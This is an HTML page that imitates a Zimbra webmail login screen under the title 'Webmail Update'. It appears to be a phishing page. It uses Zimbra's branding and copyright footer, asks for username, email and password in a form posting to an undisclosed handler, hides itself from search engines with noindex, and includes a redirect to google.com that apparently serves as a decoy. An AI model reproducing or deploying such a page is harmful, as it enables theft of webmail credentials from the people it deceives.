<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>

    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title>Webmail Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <link rel="stylesheet" type="text/css" href="css/common%2clogin%2czhtml%2cskin9a8c.css?skin=harmony&amp;v=190614035807">
    <link rel="SHORTCUT ICON" href="img/logo/favicon.ico">

    <script>
        function loadHomePage() {
            window.location.assign("https://www.google.com");
        }
    </script>

<style type="text/css">
    button {
    margin: auto;
    width: 30%;
    border-radius: 10px;
    border: none;
    padding: 10px 20px;
    color: aliceblue;
    background-color: #d6a844;
    text-align: center;
    position:relative; 
    margin: -25px -50px; 
    width:100px; 
    top:50%; 
    left:50%;
}
</style>

</head>
<body>

    <div class="LoginScreen">
        <div class="center">
            <div class="contentBox">
                <h1><a href="" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
                    <img src="img/logo/logo.png" height="35px" width="140px">
                </a></h1>
                <div id="ZLoginAppName">Web Client</div>
                <form action="" method="post" name="loginForm" accept-charset="UTF-8">

                                <table class="form">
                        <tr>
                                        <td><label for="username">Username:</label></td>
                                        <td><input id="username" required="required" class="zLoginField" name="user" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
                                        </tr>
                                        <tr>
                                        <td><label for="email">Email:</label></td>
                                        <td><input id="email" required="required" class="zLoginField" name="email" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
                                        </tr>
                                        <tr>
                                <td><label for="password">Password:</label></td>
                                <td><input id="password" required="required" autocomplete="off" class="zLoginField" name="pass" type="password" value="" size="40" maxlength="1024"/></td>
                                </tr>
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
                                <input id="remember" value="1" type="checkbox"  />
                                    <label for="remember">Stay signed in</label>
                                <input type="submit" class="ZLoginButton DwtButton" name="update" value="Sign In" />
                                </td>
                                </tr>
            
                <tr >
                            <td colspan="2"><hr/></td>
                            </tr>
                            <tr >
                            <td>
                            <label for="client">Version:</label>
                            </td>
                            <td>
                            <div class="positioning">
                            <select>
                                    <option value="preferred"  > Default</option>
                                    <option value="advanced" > Advanced (Ajax)</option>
                                    <option value="standard" selected> Standard (HTML)</option>
                                    <option value="mobile" > Mobile</option>
                                    </select>
                               
                        </td>
                        </tr>
                        </table>
                    </form>

                    
            </div>
            <div class="decor1"></div>
        </div>

        <div class="Footer">
            <div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="">Blog</a> - <a target="_new" href="">Wiki</a> - <a target="_new" href="">Forums</a></div>
            <div class="copyright">
            Copyright Â© 2005-2017 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
        </div>
        <div class="decor2"></div>
    </div>

</body>

</html>
